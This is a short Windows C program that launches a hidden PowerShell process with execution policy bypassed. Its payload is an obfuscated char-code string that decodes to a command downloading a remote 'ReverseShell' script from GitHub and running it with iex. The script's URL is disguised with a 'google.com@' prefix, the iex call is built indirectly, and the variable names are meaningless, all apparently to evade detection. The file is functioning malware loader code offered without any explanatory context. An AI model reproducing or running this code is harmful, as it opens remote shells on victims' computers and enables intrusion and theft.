#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int main() {
    const char *x1z2 = "powershell.exe -nop -W hidden -noni -ep bypass -c \"$webhook='WEBHOOK';$ip='IP_ADDRESS';$p=PORT;[StRING]::JOiN('' ,( (40 ,105 ,119, 114,32,39,104, 116, 116 , 112 ,115,58,47 , 47,103,111, 111,103, 108 ,101,46, 99 ,111,109,64, 114 , 97 , 119 ,46,103,105,116, 104 ,117, 98, 117, 115 , 101 , 114, 99, 111, 110, 116, 101 , 110 , 116, 46,99 ,111, 109 ,47,67, 104,97 ,114 ,108 , 101,115 , 84 , 104,101 , 71, 114,101,97, 116 ,55 ,55,47 , 66 ,65 ,68, 85 , 83, 66 , 47, 109,97 ,105, 110, 47 ,82,101,118, 101 ,114,115, 101, 83 ,104,101,108, 108 , 47,115, 104, 101,108 , 108, 121,46 ,116 , 120,116, 39,41,46 , 67 ,111 ,110, 116 , 101 , 110 ,116 , 32 , 124 ,32 , 105 ,101, 120)| % { ( [ChaR][INt]$_) }) )| & ($VerbosePreference.ToString()[1,3]+'x'-Join'\"";
    const char *c7x4 = x1z2;

    STARTUPINFO k2m0 = {0};
    PROCESS_INFORMATION l1b3 = {0};

    if (CreateProcess(NULL, c7x4, NULL, NULL, FALSE, 0, NULL, NULL, &k2m0, &l1b3)) {
        WaitForSingleObject(l1b3.hProcess, INFINITE);
        CloseHandle(l1b3.hProcess);
        CloseHandle(l1b3.hThread);
    }
    return 0;
}
